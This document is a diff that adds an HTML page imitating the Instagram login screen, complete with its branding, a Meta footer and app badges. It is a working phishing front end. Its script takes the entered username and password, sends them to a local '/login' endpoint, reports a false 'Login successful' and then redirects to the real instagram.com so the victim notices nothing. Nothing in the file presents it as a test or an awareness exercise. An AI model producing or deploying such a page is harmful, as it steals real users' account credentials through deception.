@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --ig-gradient: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+      --ig-blue: #0095f6;
+      --ig-blue-hover: #1877f2;
+      --border: #dbdbdb;
+      --text-primary: #262626;
+      --text-secondary: #8e8e8e;
+      --bg: #fafafa;
+      --card-bg: #fff;
+    }
+
+    body {
+      font-family: 'DM Sans', sans-serif;
+      background: var(--bg);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    /* ── MAIN LAYOUT ── */
+    .wrapper {
+      display: flex;
+      align-items: center;
+      gap: 32px;
+      max-width: 960px;
+      width: 100%;
+    }
+
+    /* ── PHONE MOCKUP ── */
+    .phone-side {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      min-width: 280px;
+    }
+
+    .phone {
+      width: 260px;
+      height: 530px;
+      background: #fff;
+      border-radius: 36px;
+      border: 2px solid #222;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.18);
+      overflow: hidden;
+      position: relative;
+    }
+
+    .phone::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 50%;
+      transform: translateX(-50%);
+      width: 100px; height: 22px;
+      background: #222;
+      border-radius: 0 0 18px 18px;
+      z-index: 2;
+    }
+
+    .phone-screen {
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(160deg, #fff0f5 0%, #f0f4ff 50%, #fffbe6 100%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 14px;
+      padding: 20px;
+      padding-top: 40px;
+    }
+
+    .phone-logo {
+      font-family: 'Grand Hotel', cursive;
+      font-size: 28px;
+      background: var(--ig-gradient);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .phone-post {
+      width: 100%;
+      border-radius: 10px;
+      overflow: hidden;
+      border: 1px solid #eee;
+    }
+
+    .post-header {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 10px;
+      background: #fff;
+    }
+
+    .post-avatar {
+      width: 28px; height: 28px;
+      border-radius: 50%;
+      background: var(--ig-gradient);
+      flex-shrink: 0;
+    }
+
+    .post-username {
+      font-size: 11px;
+      font-weight: 600;
+      color: #262626;
+    }
+
+    .post-image {
+      width: 100%;
+      height: 140px;
+      object-fit: cover;
+      background: linear-gradient(135deg, #f093fb 0%, #f5576c 50%, #fda085 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 36px;
+    }
+
+    .post-actions {
+      background: #fff;
+      padding: 8px 10px;
+      display: flex;
+      gap: 10px;
+      font-size: 18px;
+    }
+
+    .post-likes {
+      background: #fff;
+      padding: 0 10px 8px;
+      font-size: 10px;
+      font-weight: 600;
+    }
+
+    /* ── LOGIN SIDE ── */
+    .login-side {
+      flex: 0 0 360px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 2px;
+      padding: 40px 40px 24px;
+      text-align: center;
+    }
+
+    .logo {
+      font-family: 'Grand Hotel', cursive;
+      font-size: 52px;
+      background: var(--ig-gradient);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      display: block;
+      margin-bottom: 24px;
+      letter-spacing: 1px;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 6px;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 9px 12px;
+      font-size: 12px;
+      font-family: 'DM Sans', sans-serif;
+      background: #fafafa;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      outline: none;
+      color: var(--text-primary);
+      transition: border-color 0.15s;
+    }
+
+    .input-group input:focus {
+      border-color: #a8a8a8;
+      background: #fff;
+    }
+
+    .input-group input.has-value + .placeholder-label,
+    .input-group input:focus + .placeholder-label {
+      top: 4px;
+      font-size: 9px;
+      color: var(--text-secondary);
+    }
+
+    .placeholder-label {
+      position: absolute;
+      top: 50%;
+      left: 12px;
+      transform: translateY(-50%);
+      font-size: 12px;
+      color: #aaa;
+      pointer-events: none;
+      transition: all 0.15s;
+      background: transparent;
+    }
+
+    .input-group input:not(:placeholder-shown) + .placeholder-label {
+      top: 4px;
+      font-size: 9px;
+      color: var(--text-secondary);
+    }
+
+    .input-group input {
+      padding-top: 14px;
+      padding-bottom: 4px;
+    }
+
+    .show-btn {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--text-primary);
+      font-family: 'DM Sans', sans-serif;
+    }
+
+    .btn-login {
+      width: 100%;
+      margin-top: 10px;
+      padding: 8px;
+      background: var(--ig-blue);
+      color: #fff;
+      font-size: 14px;
+      font-weight: 700;
+      font-family: 'DM Sans', sans-serif;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.2s, opacity 0.2s;
+      letter-spacing: 0.3px;
+    }
+
+    .btn-login:hover { background: var(--ig-blue-hover); }
+    .btn-login:disabled { opacity: 0.5; cursor: not-allowed; }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin: 18px 0;
+      color: var(--text-secondary);
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+    }
+
+    .fb-login {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      color: #385185;
+      font-weight: 700;
+      font-size: 14px;
+      cursor: pointer;
+      text-decoration: none;
+      transition: opacity 0.15s;
+    }
+
+    .fb-login:hover { opacity: 0.75; }
+
+    .fb-icon {
+      width: 18px;
+      height: 18px;
+      background: #385185;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 12px;
+      font-weight: 900;
+    }
+
+    .forgot-link {
+      display: block;
+      margin-top: 14px;
+      font-size: 12px;
+      color: #00376b;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .forgot-link:hover { text-decoration: underline; }
+
+    /* ── SIGNUP CARD ── */
+    .signup-card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 2px;
+      padding: 20px;
+      text-align: center;
+      font-size: 14px;
+      color: var(--text-primary);
+    }
+
+    .signup-card a {
+      color: var(--ig-blue);
+      font-weight: 700;
+      text-decoration: none;
+    }
+
+    .signup-card a:hover { text-decoration: underline; }
+
+    /* ── APP BADGES ── */
+    .app-section {
+      text-align: center;
+      margin-top: 6px;
+    }
+
+    .app-section p {
+      font-size: 14px;
+      color: var(--text-primary);
+      margin-bottom: 12px;
+    }
+
+    .badges {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .badge {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      border: 1px solid #222;
+      border-radius: 6px;
+      padding: 6px 12px;
+      text-decoration: none;
+      color: #222;
+      font-size: 12px;
+      transition: background 0.15s;
+    }
+
+    .badge:hover { background: #f5f5f5; }
+    .badge span:first-child { font-size: 20px; }
+    .badge-text { text-align: left; }
+    .badge-text small { display: block; font-size: 9px; color: #555; }
+    .badge-text strong { font-size: 13px; }
+
+    /* ── TOAST ── */
+    .toast {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%) translateY(80px);
+      background: #262626;
+      color: #fff;
+      padding: 12px 24px;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 500;
+      transition: transform 0.35s cubic-bezier(0.34,1.56,0.64,1);
+      z-index: 999;
+      white-space: nowrap;
+    }
+
+    .toast.show { transform: translateX(-50%) translateY(0); }
+    .toast.error { background: #ed4956; }
+    .toast.success { background: #2ecc71; }
+
+    /* ── SPINNER ── */
+    .spinner {
+      display: inline-block;
+      width: 14px; height: 14px;
+      border: 2px solid rgba(255,255,255,0.4);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+      vertical-align: middle;
+      margin-right: 6px;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ── FOOTER ── */
+    footer {
+      margin-top: 40px;
+      text-align: center;
+      color: var(--text-secondary);
+      font-size: 12px;
+    }
+
+    footer a {
+      color: var(--text-secondary);
+      text-decoration: none;
+      margin: 0 6px;
+    }
+
+    footer a:hover { text-decoration: underline; }
+
+    /* ── RESPONSIVE ── */
+    @media (max-width: 768px) {
+      .phone-side { display: none; }
+      .login-side { flex: 0 0 100%; max-width: 360px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="wrapper">
+
+    <!-- Phone Mockup -->
+    <div class="phone-side">
+      <div class="phone">
+        <div class="phone-screen">
+          <div class="phone-logo">Instagram</div>
+          <div class="phone-post">
+            <div class="post-header">
+              <div class="post-avatar"></div>
+              <div class="post-username">travel.vibes</div>
+            </div>
+            <div class="post-image">🌅</div>
+            <div class="post-actions">❤️ 💬 ✈️</div>
+            <div class="post-likes">2,847 likes</div>
+          </div>
+          <div class="phone-post">
+            <div class="post-header">
+              <div class="post-avatar" style="background: linear-gradient(135deg,#43e97b,#38f9d7)"></div>
+              <div class="post-username">foodie.daily</div>
+            </div>
+            <div class="post-image" style="background: linear-gradient(135deg,#f6d365,#fda085)">🍜</div>
+            <div class="post-actions">❤️ 💬 🔖</div>
+            <div class="post-likes">1,203 likes</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Login Form -->
+    <div class="login-side">
+      <div class="card">
+        <span class="logo">Instagram</span>
+
+        <div class="input-group">
+          <input type="text" id="username" autocomplete="username" placeholder=" " />
+          <label class="placeholder-label">Phone number, username, or email</label>
+        </div>
+
+        <div class="input-group">
+          <input type="password" id="password" autocomplete="current-password" placeholder=" " />
+          <label class="placeholder-label">Password</label>
+          <button class="show-btn" type="button" onclick="togglePassword(this)">Show</button>
+        </div>
+
+        <button class="btn-login" id="loginBtn" onclick="handleLogin()">Log in</button>
+
+        <div class="divider">OR</div>
+
+        <a class="fb-login" href="#">
+          <div class="fb-icon">f</div>
+          Log in with Facebook
+        </a>
+
+        <a class="forgot-link" href="#">Forgot password?</a>
+      </div>
+
+      <div class="signup-card">
+        Don't have an account? <a href="#">Sign up</a>
+      </div>
+
+      <div class="app-section">
+        <p>Get the app.</p>
+        <div class="badges">
+          <a class="badge" href="#">
+            <span>🍎</span>
+            <div class="badge-text">
+              <small>Download on the</small>
+              <strong>App Store</strong>
+            </div>
+          </a>
+          <a class="badge" href="#">
+            <span>▶</span>
+            <div class="badge-text">
+              <small>Get it on</small>
+              <strong>Google Play</strong>
+            </div>
+          </a>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Footer -->
+  <footer>
+    <div style="margin-bottom: 12px;">
+      <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a>
+      <a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a>
+      <a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a>
+    </div>
+    <span>© 2025 Instagram from Meta</span>
+  </footer>
+
+  <!-- Toast Notification -->
+  <div class="toast" id="toast"></div>
+
+  <script>
+    // Toggle password visibility
+    function togglePassword(btn) {
+      const input = document.getElementById("password");
+      if (input.type === "password") {
+        input.type = "text";
+        btn.textContent = "Hide";
+      } else {
+        input.type = "password";
+        btn.textContent = "Show";
+      }
+    }
+
+    // Show toast notification
+    function showToast(message, type = "") {
+      const toast = document.getElementById("toast");
+      toast.textContent = message;
+      toast.className = `toast ${type} show`;
+      setTimeout(() => { toast.className = "toast"; }, 3000);
+    }
+
+    // Handle login submission
+    async function handleLogin() {
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value;
+      const btn = document.getElementById("loginBtn");
+
+      if (!username || !password) {
+        showToast("Please enter your credentials.", "error");
+        return;
+      }
+
+      // Loading state
+      btn.disabled = true;
+      btn.innerHTML = '<span class="spinner"></span>Logging in...';
+
+      try {
+        const res = await fetch("/login", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ username, password })
+        });
+
+        const data = await res.json();
+
+        if (data.success) {
+          showToast("✅ Login successful! Redirecting...", "success");
+          // Redirect to Instagram after 1.5 seconds
+          setTimeout(() => {
+            window.location.href = "https://www.instagram.com";
+          }, 1500);
+        } else {
+          showToast(data.message || "Something went wrong.", "error");
+          btn.disabled = false;
+          btn.textContent = "Log in";
+        }
+      } catch (err) {
+        showToast("❌ Server not reachable.", "error");
+        btn.disabled = false;
+        btn.textContent = "Log in";
+      }
+    }
+
+    // Allow pressing Enter to submit
+    document.addEventListener("keydown", (e) => {
+      if (e.key === "Enter") handleLogin();
+    });
+  </script>
+</body>
+</html>
